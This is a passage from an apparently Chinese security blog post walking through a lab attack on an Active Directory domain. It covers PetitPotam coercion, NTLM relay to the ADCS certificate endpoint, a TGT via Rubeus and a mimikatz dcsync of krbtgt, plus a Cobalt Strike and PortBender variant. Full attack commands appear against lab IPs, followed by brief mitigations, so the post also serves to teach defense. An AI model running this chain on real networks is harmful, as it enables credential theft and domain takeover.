<h4 id="利用PetitPotam中继ADCS接管域"><a href="#利用PetitPotam中继ADCS接管域" class="headerlink" title="利用PetitPotam中继ADCS接管域"></a>利用<code>PetitPotam</code>中继<code>ADCS</code>接管域</h4><p>​    由于<code>NTLM Relay</code>不能够中继自己，所以利用这种方式进行攻击，更像是一种提权手段，在已知域内一台主机账号密码的情况下，可以让他向<code>CS</code>发送<code>NTLM</code>请求，获取一个证书。</p>
<p>​    最近内网攻防比较火的一种攻击方式，利用<code>PetitPotam</code>，强制域内主机发起<code>NTLM Hash</code>，中继到<code>ADCS</code>获取证书，从中提取<code>TGT</code>，利用票据传递接管域控。</p>
<p>​    <code>PetitPotam</code>中继攻击，这是一种新型的<code>NTLM Relay</code>攻击利用手法，其利用了微软加密文件系统远程协议。利用该漏洞，攻击者连接到<code>LSARPC</code>后能够强制触发目标机器向指定的远程服务器发送<code>Net-NTLM Hash</code>，在获取到<code>Net-NTLM Hash</code>之后，就能够进行<code>NTLM Relay</code>攻击。</p>
<p>​    而<code>ADCS</code>证书服务器在默认安装之后，由于<code>ADCS</code>的<code>HTTP</code>证书接口（<code>/certsrv/certfnsh.asp </code>）没有启用<code>NTLM</code>中继保护，并且在<code>HTTP</code>请求的时候，<code>Authorization HTTP</code>标头明确指定只允许通过<code>NTLM</code>进行身份验证。因此，配合上面的<code>PetitPotam</code>的方式，强制域控向该接口发送<code>Net-NTLM Hash</code>，从而可以获取到一个域内的证书，从中提取<code>TGT</code>，利用票据传递接管域控。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125132241179.png" alt="image-20211125132241179"></p>
<p>​    在内网环境中，如果存在两个域控（一个主域控，一个辅助域控），都安装了<code>ADCS</code>证书服务的话，可以导出<code>TGT</code>，从而接管域控：（实验拓扑图）</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125165454471.png" alt="image-20211125165454471"></p>
<p>​    由于在<code>win2008</code>和<code>win2012</code>环境下，通过<code>PetitPotam</code>强制域控发起<code>Net-NTLM Hash</code>可以以匿名的方式，也就是说不需要知道账号密码也可发送。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PetitPotam.py -d de1ay 10.10.10.25 10.10.10.99</span><br></pre></td></tr></table></figure>

<p>​    强制辅助域控（10.10.10.99）向本机（10.10.10.25）的445端口发送<code>Net-NTLM Hash</code>，然后在本地主机上捕获到<code>Net-NTLM Hash</code>之后，发起中继攻击，中继到域控主机（10.10.10.10）的<code>ADCS</code>服务上申请一个证书：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125165436605.png" alt="image-20211125165436605"></p>
<p>​    申请到证书之后，就可以通过<code>Rubeus</code>攻击从中提取出来<code>TGT</code>，转而接管域控：（这里假设<code>Win7</code>客户机已经被拿下，接下来操作在<code>Win7</code>上进行即可）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:username /certificate:证书的base64值 /ptt</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125165751781.png" alt="image-20211125165751781"></p>
<p>​    通过<code>mimikatz</code>可以查看<code>kerberos</code>票据信息：<code>kerberos::list</code>，导出<code>krbtgt</code>的哈希值：<code>lsadump::dcsync /user:krbtgt /csv</code></p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125170536240.png" alt="image-20211125170536240"></p>
<p>​    而现实的网络拓扑环境可能是这个样子：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125173645507.png" alt="image-20211125173645507"></p>
<p>​    所有的流量都通过<code>Win7</code>客户机发送给内网主机。<code>Win7</code>客户机的445端口被占用，此时想要通过同样的方式，攻击域控的<code>ADCS</code>可以使用<code>PortBender</code>将<code>TCP</code>流量重定向。</p>
<p>​    具体攻击思路是将<code>Win7</code>上面的<code>445</code>端口流量重定向之后，<code>TeamServer</code>通过远程流量转发的方式，传回攻击者监听的445端口。攻击者开启<code>socks</code>代理，将流量传送到域控的80端口，请求获取一个证书。</p>
<p>​    我这里利用<code>Cobalt Strick</code>，拿到<code>Win7</code>客户机的一个<code>System</code>权限的<code>Beacon</code>后，开启一个<code>socks</code>代理：<code>socks 1080</code>，然后远程转发端口流量，将<code>8445</code>的流量全部转发到攻击者的<code>445</code>端口：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125180619684.png" alt="image-20211125180619684"></p>
<p>​    之后上传<code>WinDivert32.sys</code>（我这里<code>Win7</code>是32位的），执行<code>PortBender  redirect 445 8445</code>，将<code>Win7</code>上的<code>445</code>端口流量全部转发到8445端口。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125180945149.png" alt="image-20211125180945149"></p>
<p>​    攻击机配置完代理之后，在攻击机上面开启攻击<code>ADCS</code>的脚本并监听来自445端口的流量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125181138847.png" alt="image-20211125181138847"></p>
<p>​    然后通过代理的方式，利用<code>PetitPotm</code>向辅助域控发送流量，强制其发送<code>Net-NTLM Hash</code>给<code>Win7</code>的445端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 PetitPotam.py -d de1ay 10.10.10.201 10.10.10.99</span><br></pre></td></tr></table></figure>

<p>​    <img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125181339132.png" alt="image-20211125181339132"></p>
<p> 由于网络问题，多发几次包之后，就可以获取到证书信息：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211125181422207.png" alt="image-20211125181422207"></p>
<h2 id="中继攻击防御措施"><a href="#中继攻击防御措施" class="headerlink" title="中继攻击防御措施"></a>中继攻击防御措施</h2><p>1、开启签名保护 </p>
<p>​     默认只有域控是开启了<code>SMB</code>签名，⽽<code>LDAP</code>签名默认策略是协商签名，也就是说是否签名是由客户端决定的。</p>
<p>2、<code>EAP</code>（<code>Enhanced Protection Authentication</code>）：</p>
<p>   <code>NTLM</code>认证和⼀个安全通道进⾏绑定，在 <code>NTLM</code> 认证过程中，最后的<code> NTLM</code>认证数据报⽂包含⼀个⽬标应⽤服务器的证书摘要，这个摘要使⽤客户端的 <code>NTLM</code> 值进⾏签名保护，可以防⽌伪造证书的攻击。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    <code>NTLM Relay</code>是一种中间人攻击的方式，一般而言都是被动攻击，等待连接操作，但<code>PetitPotam</code>的出现，发生了一些改变。正如上面实验，在两台域控都安装了<code>ADCS</code>的情况下，不需要被动等待即可发起攻击。</p>
<p>参考文章：</p>
<p>【委派攻击】<a target="_blank" rel="noopener" href="https://www.bugbank.cn/live/view.html?id=114136">https://www.bugbank.cn/live/view.html?id=114136</a></p>
<p>【利用<code>kerberos</code>身份验证中继攻击】<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html">https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html</a></p>
<p>【中继的实战打法】<a target="_blank" rel="noopener" href="https://rastamouse.me/ntlm-relaying-via-cobalt-strike/">https://rastamouse.me/ntlm-relaying-via-cobalt-strike/</a></p>
<p>【证书服务器攻击与防御】<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/245791#h2-11">https://www.anquanke.com/post/id/245791#h2-11</a></p>
<p>【<code>ExchangeRelayx</code>】<a target="_blank" rel="noopener" href="https://www.freebuf.com/news/184594.html">https://www.freebuf.com/news/184594.html</a></p>
<p>【<code>Portbender</code>端口复用】<a target="_blank" rel="noopener" href="http://cn-sec.com/archives/437340.html">http://cn-sec.com/archives/437340.html</a></p>
<p>【利用<code>PetitPotam</code>进行<code>NTLM Relay</code>攻击】<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/120368697">https://blog.csdn.net/qq_36119192/article/details/120368697</a></p>
<p>【无需<code>Linux</code>进行<code>NTLM Relay</code>】<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1896216">https://cloud.tencent.com/developer/article/1896216</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/12/15/%E6%B5%85%E6%9E%90%E5%9F%9F%E5%86%85NTLM%20Relay%E6%94%BB%E5%87%BB/" data-id="cl8h223ic000cb3dp95umeb50" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">xxe外部实体注入漏洞</a>
          </li>
        
          <li>
            <a href="/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/">WordPress SQL注入漏洞（CVE-2022-21661分析与复现）</a>
          </li>
        
          <li>
            <a href="/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/">Java安全---JNDI注入解析</a>
          </li>
        
          <li>
            <a href="/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/">Java CC链1-5分析与总结</a>
          </li>
        
          <li>
            <a href="/2022/02/11/RWCTF%204th%20Desperate%20Cat%20%E8%B5%9B%E9%A2%98%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%A4%8D%E7%8E%B0/">RWCTF 4th Desperate Cat 赛题学习与复现</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>